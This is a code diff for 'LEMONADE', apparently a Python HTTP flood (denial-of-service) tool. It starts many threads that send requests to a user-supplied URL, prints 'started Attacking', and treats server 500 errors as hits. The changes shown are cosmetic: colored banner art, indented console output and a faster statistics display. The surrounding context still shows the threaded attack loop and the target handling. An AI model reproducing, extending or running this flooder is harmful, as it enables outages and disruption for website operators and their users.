@@ -6,6 +6,9 @@ import requests
 import sys
 import time
 import os
+from pystyle import Center, Colors, Colorate
+from colorama import Fore, Back, Style
+
 
 try:
     from dictknife import deepmerge
@@ -13,12 +16,22 @@ except:
     print("dictknifeモジュールが見つかりませんでした。\npip install dictknife してインストールしてください")
     os._exit(0)
 
-print("""
-██      ███████ ███    ███  ██████  ███    ██  █████  ██████  ███████ 
-██      ██      ████  ████ ██    ██ ████   ██ ██   ██ ██   ██ ██      
-██      █████   ██ ████ ██ ██    ██ ██ ██  ██ ███████ ██   ██ █████   
-██      ██      ██  ██  ██ ██    ██ ██  ██ ██ ██   ██ ██   ██ ██      
-███████ ███████ ██      ██  ██████  ██   ████ ██   ██ ██████  ███████ 
+os.system("cls")
+time.sleep(0.5)
+print(f"""{Fore.LIGHTYELLOW_EX}
+
+
+
+
+
+
+
+
+                        ██      ███████ ███    ███  ██████  ███    ██  █████  ██████  ███████ 
+                        ██      ██      ████  ████ ██    ██ ████   ██ ██   ██ ██   ██ ██      
+                        ██      █████   ██ ████ ██ ██    ██ ██ ██  ██ ███████ ██   ██ █████   
+                        ██      ██      ██  ██  ██ ██    ██ ██  ██ ██ ██   ██ ██   ██ ██      
+                        ███████ ███████ ██      ██  ██████  ██   ████ ██   ██ ██████  ███████ {Fore.RESET}
 """)
 for _ in range(3):
     print("")
@@ -75,7 +88,7 @@ def buildblock(size):
 
 if(config["useconfigurl"] == False):
     url = []
-    url.append(input("URL:"))
+    url.append(input("                            URL:"))
     if str(url[0]).count("/")==2:
         url[0] = url[0] + "/"
     m = re.search('(https?\://)?([^/]*)/?.*', url[0])
@@ -92,7 +105,7 @@ else:
         m = re.search('(https?\://)?([^/]*)/?.*', url[i])
         host.append(m.group(2))
 
-thrd = int(input("Thread Count:"))
+thrd = int(input("                            Thread Count:"))
 if thrd > config["thread"]["maxthreads"] and config["thread"]["limiter"] == True:
     thrd = config["thread"]["maxthreads"]
 
@@ -186,7 +199,7 @@ class httpcall(threading.Thread):
                         continue
                 if str(lres.status_code).startswith("50"):
                     set_flag(1)
-                    print("Res 500 "+usehost)
+                    print("                        Res 500 "+usehost)
                     s = useurl
                     b = usehost
                     url.remove(s)
@@ -194,7 +207,7 @@ class httpcall(threading.Thread):
                 elif isignorestatus(lres.status_code):
                     requestcnt()
                 else:
-                    print("A request error has occurred. "+str(lres.status_code)+" at "+usehost)
+                    print("                        A request error has occurred. "+str(lres.status_code)+" at "+usehost)
                     s = useurl
                     b = usehost
                     url.remove(s)
@@ -220,35 +233,33 @@ class MonitorThread(threading.Thread):
         self.newrequest = []
     def run(self):
         while True:
-            time.sleep(5)
+            time.sleep(0.5)
             self.newrequest.append(request_counter - self.beforerequestcount)
             allcount = 0
             for i in self.newrequest:
                 allcount += i
-            print(f"Summary All:{request_counter}/New Request:{request_counter - self.beforerequestcount}/Average new request:{round(allcount / len(self.newrequest))}")
+            print(f"\r                            Summary All:{request_counter}/New Request:{request_counter - self.beforerequestcount}/Average new request:{round(allcount / len(self.newrequest))}",end="")
             self.beforerequestcount = request_counter
 
 
 
-print(url)
-print(host)
-print("---------------LEMONADE started Attacking---------------")
-MonitorThread().start()
-for i in range(thrd):
-    httpcall().start()
-#print("Success fully started all threads")
-
-
+#print(url)
+#print(host)
+print("                            ---------------LEMONADE started Attacking---------------")
 try:
+    MonitorThread().start()
+    for i in range(thrd):
+        httpcall().start()
+#print("Success fully started all threads")
     while True:
         #print(f"Summary Requested: {request_counter}")
         if flag == 2:
-            print("---------------LEMONADE stopped Attacking---------------")
+            print("\n                            ---------------LEMONADE stopped Attacking---------------")
             os._exit(0)
         if len(url) == 0:
-            print("---------------LEMONADE stopped Attacking---------------")
+            print("\n                          ---------------LEMONADE stopped Attacking---------------")
             os._exit(0)
         time.sleep(0.05)
 except KeyboardInterrupt:
-    print("---------------LEMONADE stopped Attacking---------------")
+    print("\n                            ---------------LEMONADE stopped Attacking---------------")
     os._exit(0)
